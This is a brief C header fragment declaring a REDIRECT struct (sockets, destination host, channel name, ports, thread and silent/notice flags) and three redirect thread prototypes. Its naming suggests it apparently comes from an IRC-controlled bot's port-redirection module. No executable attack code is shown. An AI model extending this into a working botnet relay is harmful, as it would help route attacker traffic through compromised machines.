#ifndef NO_REDIRECT
typedef struct REDIRECT 
{
	SOCKET sock;
	SOCKET csock;
	char dest[MAXHOSTNAME];
	char chan[MAXCHANLEN];
	unsigned short port;
	unsigned short lport;
	int threadnum;
	int cthreadnum;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;
	BOOL cgotinfo;

} REDIRECT;

DWORD WINAPI RedirectThread(LPVOID param);
DWORD WINAPI RedirectLoopThread(LPVOID param);
DWORD WINAPI RedirectLoop2Thread(LPVOID param);
#endif
